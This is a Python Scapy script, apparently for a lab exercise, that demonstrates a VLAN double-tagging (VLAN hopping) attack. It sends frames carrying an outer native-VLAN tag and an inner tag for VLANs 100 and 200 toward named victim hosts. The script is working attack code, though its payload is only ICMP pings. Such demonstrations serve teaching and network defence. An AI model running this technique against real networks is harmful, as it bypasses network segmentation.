#!/usr/bin/env python3
# ================================================================
# VLAN Double Tagging Attack Demo (Node D)
# ------------------------------------------------
# Sends Ethernet frames with two VLAN tags:
#   Outer VLAN = 1 (native VLAN)
#   Inner VLAN = 100 or 200 (target VLAN)
# ================================================================

from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
import time

# Interface inside nodeD
iface = "vethD"

# Victim IPs (Nodes in VLAN 100 and VLAN 200)
targets = {
    "VLAN100": "192.168.100.10",  # Node A
    "VLAN200": "192.168.200.30"   # Node C
}

def send_double_tagged(target_ip, inner_vlan):
    """
    Send a double-tagged ICMP Echo Request
    Outer VLAN -> 1 (native)
    Inner VLAN -> target VLAN (100 or 200)
    """
    print(f"[*] Sending double-tagged frame to {target_ip} (Inner VLAN={inner_vlan})")

    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        Dot1Q(vlan=1) /
        Dot1Q(vlan=inner_vlan) /
        IP(src="192.168.1.40", dst=target_ip) /
        ICMP()
    )

    # Send multiple packets for visibility
    sendp(pkt, iface=iface, count=5, inter=0.5, verbose=True)


if __name__ == "__main__":
    print("[+] Starting Double Tagging Attack simulation from Node D (VLAN 1)")
    print("[*] Interface:", iface)

    time.sleep(1)
    # Try VLAN 100
    send_double_tagged(targets["VLAN100"], 100)

    # Try VLAN 200
    send_double_tagged(targets["VLAN200"], 200)

    print("[✓] Packets sent! Capture with tcpdump or Wireshark on S2 or NodeB to observe tags.")
